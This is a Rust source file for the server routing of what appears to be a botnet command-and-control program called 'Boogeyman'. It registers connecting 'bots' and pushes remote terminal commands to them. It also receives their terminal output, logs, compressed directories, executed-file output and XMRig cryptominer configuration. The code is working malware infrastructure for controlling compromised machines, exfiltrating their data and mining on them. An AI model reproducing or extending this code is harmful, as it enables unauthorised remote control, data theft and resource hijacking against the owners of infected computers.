use std::sync::Arc;
use chrono::Utc;
use client_vars::types::{
    receive::{ CallTerminalCommandParams, ClientAction, ClientParams },
    send::{ BoogeymanSendPayload, ServerAction, ServerParams },
};
use tokio::{ net::TcpStream, sync::{ Mutex, RwLock } };
use anyhow::Result;
use crate::server::{
    http_server::{ Bot, ClientInstance, ServerHandler },
    sanitization::verify_client_init,
};

pub async fn route_client(
    handler: &ServerHandler,
    payload: BoogeymanSendPayload,
    stream_ref: Arc<Mutex<TcpStream>>
) -> Result<()> {
    match payload.action {
        ServerAction::Init => {
            return init(handler, payload, stream_ref).await;
        }
        ServerAction::TerminalOutput => {
            // in each - verify id and version - must exist in inited list if not ignore
            if let ServerParams::TerminalOutput(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);

                if let Some(output) = &params.output {
                    let bot_map = handler.bot_map.read().await;
                    let bot = bot_map.get(&payload.id).unwrap();
                    let mut instances = bot.client_instances.write().await;

                    let client_instance: &mut ClientInstance = instances
                        .iter_mut()
                        .find(|instance| instance.version == payload.version)
                        .unwrap();
                    client_instance.console = output.clone();
                }
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::LogsData => {
            if let ServerParams::LogsData(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::CompressedDir => {
            if let ServerParams::CompressedDir(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::UpdateThumbnail => {
            if let ServerParams::UpdateThumbnail(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::UpdateDynamicData => {
            if let ServerParams::UpdateDynamicData(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::ExecFileOutput => {
            if let ServerParams::ExecFileOutput(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::XMRigConfig => {
            if let ServerParams::XMRigConfig(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
    }
    Ok(())
}

pub async fn init(
    handler: &ServerHandler,
    payload: BoogeymanSendPayload,
    stream_ref: Arc<Mutex<TcpStream>>
) -> Result<()> {
    if let ServerParams::Init(params) = payload.params {
        verify_client_init(&params)?;
        // first sanitize botstate
        let mut bot_map = handler.bot_map.write().await;
        let client_new_instance = ClientInstance {
            join_date: Utc::now().to_rfc3339(),
            version: payload.version,
            bot_state: params.bot_state,
            console: String::new(),
            stream: stream_ref.clone(),
        };
        if let Some(bot) = bot_map.get_mut(&payload.id) {
            let mut client_instances = bot.client_instances.write().await;
            client_instances.push(client_new_instance);
            bot.verified = true;
        } else {
            bot_map.insert(
                payload.id.clone(),
                Bot::new(
                    payload.id.clone(),
                    Arc::new(RwLock::new(vec![client_new_instance])),
                    Arc::new(RwLock::new(vec![])),
                    true,
                    None
                )
            );
        }
        println!("new bot : {:#?}", payload.id);

        ServerHandler::send_action_to_client(
            stream_ref.clone(),
            ClientAction::CallTerminalCommand,
            ClientParams::CallTerminalCommand(CallTerminalCommandParams {
                command: "echo test".to_owned(),
            })
        ).await?;
        ServerHandler::send_action_to_client(
            stream_ref.clone(),
            ClientAction::CallTerminalCommand,
            ClientParams::CallTerminalCommand(CallTerminalCommandParams {
                command: "echo test2".to_owned(),
            })
        ).await?;
        Ok(())
    } else {
        return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
    }
}
